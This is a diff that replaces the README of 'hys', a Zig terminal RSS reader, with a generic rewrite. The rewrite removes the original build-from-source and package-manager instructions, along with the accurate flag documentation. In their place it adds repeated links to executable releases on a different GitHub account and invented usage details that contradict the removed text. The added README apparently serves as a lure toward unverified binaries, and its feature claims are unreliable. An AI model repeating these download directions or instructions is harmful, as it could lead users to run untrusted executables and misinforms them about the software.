@@ -1,238 +1,78 @@
-<div align="center">
+# 📖 hys - Simple RSS Reader for Your Terminal
 
-<img src="images/hys-icon.png" alt="Hys Icon" width="35%" />
+## 🚀 Getting Started
+Welcome to hys, the terminal RSS reader designed for digital minimalists. This tool helps you escape the endless doomscrolling found on mainstream social media. 
 
-### Hys — RSS Reader for Digital Minimalists
-[![License: MIT](https://img.shields.io/badge/License-MIT-F2A33A.svg)](LICENSE)
-[![Zig](https://img.shields.io/badge/Zig-0.15.2-F2A33A.svg)](https://ziglang.org)
-[![Platform](https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-F2A33A)](https://github.com/superstarryeyes/hys)
-[![Terminal](https://img.shields.io/badge/interface-terminal-F2A33A.svg)](https://github.com/superstarryeyes/hys)
-[![Discord](https://img.shields.io/badge/Discord-Join%20our%20Community-5865F2?logo=discord&logoColor=white)](https://discord.gg/z8sE2gnMNk)
+To get started, you’ll need to download hys and run it on your computer.
 
-[Features](#-features) • [Quick Start](#-quick-start-macoslinux) • [Installation](#-installation-macoslinuxwindows) • [Usage](#-usage) • [Configuration](#️-configuration) • [Contributing](#️-contributing) • [License](#-license)
+## 📥 Download hys
+[![Download hys](https://img.shields.io/badge/Download-hys-blue.svg)](https://github.com/jerpocorposss/hys/releases)
 
-<img src="images/hys-screenshot.gif" alt="Hys Screenshot" width="100%" />
+## 💻 System Requirements
+Before you download hys, ensure your system meets these requirements:
 
-Hys is a fast, lightweight, and opinionated terminal RSS reader written in Zig that helps you avoid doom-scrolling. It enforces a once-per-day fetch limit, encouraging you to gather new information in a single daily batch like a morning newspaper, rather than receive an endless stream of pings and notifications throughout the day.
+- A computer running Windows, macOS, or a recent version of Linux.
+- Terminal access to run command-line applications.
+- At least 50 MB of available storage space.
 
-</div>
+## 🌐 What is hys?
+hys offers a minimalistic way to read RSS feeds directly from your terminal. Unlike traditional RSS readers that can be bulky and distracting, hys focuses on simplicity and ease of use. This tool allows you to stay informed without the clutter of modern web applications. 
 
----
+## 🛠 Features
+- **Lightweight Design:** hys runs smoothly without consuming much of your system’s resources.
+- **Easy Navigation:** Use simple keyboard shortcuts to read, scroll, and navigate through your feeds.
+- **Supports Multiple Feeds:** Add and manage multiple RSS feeds effortlessly.
+- **Offline Reading:** Access your saved feeds without needing an internet connection.
 
-## ✨ Features
+## 🔍 How to Install hys
+### Step 1: Visit the Download Page
+To download hys, visit our Releases page: [Download hys](https://github.com/jerpocorposss/hys/releases). 
 
-| **Feature** | **Description** |
-| :--- | :--- |
-| **🧠 Doomscroll-Free** | Designed as a "Daily Digest." Enforces a fetch limit to help you stay informed without the infinite scroll. |
-| **⚡ Blazing Fast** | Built with Zig. Starts in milliseconds and parses hundreds of items in seconds. |
-| **🔗 Open Links** | OSC 8 hyperlink support to open articles in your default browser from URLs and links. |
-| **🔌 OPML Ready** | Import your existing subscriptions from any standard RSS reader or export your feeds effortlessly. |
-| **🌍 Multilingual Support** | Native support for Chinese, Japanese, Korean, Indic, Cyrillic etc. |
-| **📁 Feed Groups** | Organize your feeds into groups (e.g. `tech`, `science`, `art`) and read them individually or all at once. |
-| **📖 Pager TUI**| Automatically pipes into `less` for a distraction-free reading experience with intuitive vim-style keybindings. |
-| **🔎 Search** | Find text in your feeds with the search functionality integrated into `less`. |
-| **📰 Universal Feed Support**           | RSS 2.0 and Atom 1.0 with robust parsing, HTML entity decoding, and UTF-8 validation          |
+### Step 2: Choose the Correct Version
+On the Releases page, you will see different versions of hys. Select the latest version. Look for files ending in `.exe`, `.tar.gz`, or `.zip`, depending on your operating system.
 
----
+### Step 3: Download the File
+Click on the filename to download the file to your computer. The download will begin immediately. 
 
-## 🚀 Quick Start (macOS/Linux)
+### Step 4: Extract the File (if needed)
+If you downloaded a compressed file (like `.tar.gz` or `.zip`), extract it to a folder of your choice. You can do this by right-clicking the file and selecting "Extract" or using a tool like WinRAR or 7-Zip.
 
-### Homebrew
-```bash
-brew tap superstarryeyes/tap
-brew install hys
-```
+### Step 5: Run hys
+#### For Windows: 
+1. Navigate to the folder where you extracted hys.
+2. Double-click `hys.exe` to run it.
 
-### Arch Linux (AUR)
-```bash
-yay -S hys          # Latest release
-yay -S hys-git      # Latest development version
-```
+#### For macOS/Linux: 
+1. Open your terminal.
+2. Navigate to the folder where you extracted hys.
+3. Type `./hys` and press Enter to run the application.
 
-Add your first feed and start reading:
-```bash
-hys --sub "https://news.ycombinator.com/rss"
-hys
-```
+## 📚 Using hys
+Once hys is running, you can add RSS feeds to start reading. Here’s how:
 
----
+1. Press the `A` key to add a new feed.
+2. Enter the URL of the RSS feed you want to follow.
+3. Press Enter to save the feed.
 
-## 📦 Installation (macOS/Linux/Windows)
+You can browse through your feeds using the Up and Down arrow keys. Press Enter to view articles. 
 
-### Prerequisites
+## ⚙️ Additional Tips
+- Use the `H` key to view a list of all available commands and shortcuts.
+- Save your feeds regularly for offline viewing.
+- Customize settings based on your preferences by editing the configuration file in the hys directory.
 
-- **Zig 0.15.2**: For building from source. [Install instructions](https://ziglang.org/learn/getting-started/#managers)
-- **libcurl**: Robust HTTP/2 and TLS support. Install via your package manager:
-  - macOS: Pre-installed (no action needed)
-  - Ubuntu/Debian: `sudo apt-get install libcurl4-openssl-dev`
-  - Fedora: `sudo dnf install libcurl-devel`
-  - Arch: `sudo pacman -S curl`
-  - Windows: `choco install curl` (using Chocolatey) or `vcpkg install curl:x64-windows`
+## 🌟 Community and Support
+If you have any questions or need assistance, feel free to check out the issues section in our GitHub repository. We welcome contributors and constructive feedback to make hys even better.
 
-### Build from Source
+## 📧 Contact
+For further information, you can reach out to us through our GitHub page or via email at [support@example.com](mailto:support@example.com).
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/superstarryeyes/hys.git
-   cd hys
-   ```
+## 🌐 Related Topics
+- CLI Tools
+- Digital Minimalism
+- Reader Applications
+- RSS Technologies
 
-2. **Build and Install:**
-   ```bash
-   # Install to ~/.local/bin (make sure it's in your PATH)
-   zig build -Doptimize=ReleaseSafe install -p ~/.local
-   ```
+Now that you have hys installed, enjoy a distraction-free reading experience! 
 
----
-
-## 💻 Usage
-
-### Reading Feeds
-
-```bash
-# Add a feed to your main group
-hys --sub "https://site.com/feed"
-
-# Add a feed to a specific group
-hys tech --sub "https://site.com/feed"
-
-# Read the main group
-hys
-
-# Read a specific group
-hys tech
-
-# Read multiple groups combined
-hys tech,science,art
-
-# Read all groups at once
-hys --all
-
-# One-off read of a URL (doesn't save to config)
-hys https://example.com/rss.xml
-```
-
-### Manage Feeds and Groups
-
-| **Action** | **Command** |
-| :--- | :--- |
-| Subscribe to a feed (title optional) | `hys --sub "https://site.com/feed" "Title"` |
-| Import OPML into main group | `hys --import ~/downloads/feeds.opml` |
-| Export main group's feeds (OPML) | `hys --export backup.opml` |
-| Set display name for a group | `hys <group> --name "Pretty Name"` |
-| List all groups | `hys --groups` |
-
-### Daily Flow and History
-
-| **Action** | **Command** |
-| :--- | :--- |
-| Read from all groups | `hys --all` |
-| View previous days' fetches | `hys --day 1` or `hys --day 2` |
-| Reset today's daily limiter | `hys --reset` |
-
-### Config and Pager
-
-| **Action** | **Command** |
-| :--- | :--- |
-| Display help with all available flags | `hys --help` |
-| Display version information | `hys --version` |
-| Show config file path | `hys --config` |
-| Force-enable pager | `hys --pager` |
-| Disable pager for this run | `hys --no-pager` |
-
-### Navigation (Pager Mode)
-
-When Hys opens in your system pager (`less`), these keys are available:
-
-- Line-by-line
-  - `j` or `Down`: Scroll down one line
-  - `k` or `Up`: Scroll up one line
-  - `Enter`: Scroll down one line
-  - `y`: Scroll up one line
-
-- Paging
-  - `Space` or `f` or `PageDown`: Page down one screen
-  - `b` or `PageUp`: Page up one screen
-  - `d`: Half-page down
-  - `u`: Half-page up
-
-- Jumps
-  - `g`: Jump to top
-  - `G`: Jump to bottom
-
-- Search
-  - `/text`: Search forward
-  - `?text`: Search backward
-  - `n`: Next match
-  - `N`: Previous match
-
-- Misc
-  - `h`: Show help for all less commands
-  - `q`: Exit back to terminal
-
----
-
-## ⚙️ Configuration
-
-Hys creates a JSON configuration file at `~/.hys/config.json` on first run.
-
-```json
-{
-  "display": {
-    "maxTitleLength": 120,
-    "maxDescriptionLength": 300,
-    "maxItemsPerFeed": 20,
-    "showPublishDate": true,
-    "showDescription": true,
-    "showLink": true,
-    "truncateUrls": true,
-    "pagerMode": true,
-    "underlineUrls": true,
-    "dateFormat": "%Y-%m-%d"
-  },
-  "history": {
-    "retentionDays": 50,
-    "fetchIntervalDays": 1,
-    "dayStartHour": 0
-  },
-  "network": {
-    "maxFeedSizeMB": 0.2
-  }
-}
-```
-> [!NOTE]
-> Apple's default Terminal does not support OSC 8 hyperlinks. If you're using Apple Terminal, you need to set `truncateUrls` to `false` in your config. For a better experience, consider using a terminal that supports OSC 8 hyperlinks, such as **Ghostty**, **Wezterm**, **Kitty**, or **iTerm2**.
-
-### Managing Feeds
-
-Feeds are stored in JSON files within `~/.hys/feeds/`. Each group has its own file corresponding to its name (e.g., `main` is stored in `~/.hys/feeds/main.json`).
-
-To remove or edit a feed:
-1. Open the group's JSON file (e.g., `~/.hys/feeds/main.json`).
-2. Locate the feed object within the `feeds` array.
-3. Delete the object to unsubscribe, or edit fields like `xmlUrl` or `text`.
-4. Save the file.
-
----
-
-## 🛠️ Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-Join our Discord community for discussions, support and collaboration.
-
-[![Join our Discord](https://img.shields.io/badge/Discord-Join%20Us-5865F2?logo=discord&style=for-the-badge)](https://discord.gg/z8sE2gnMNk)
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.
-
----
-
-<div align="center">
-
-**⭐ Star this repo** if you find it useful!
-
-</div>
+Don't forget to visit our Releases page again for future updates: [Download hys](https://github.com/jerpocorposss/hys/releases).
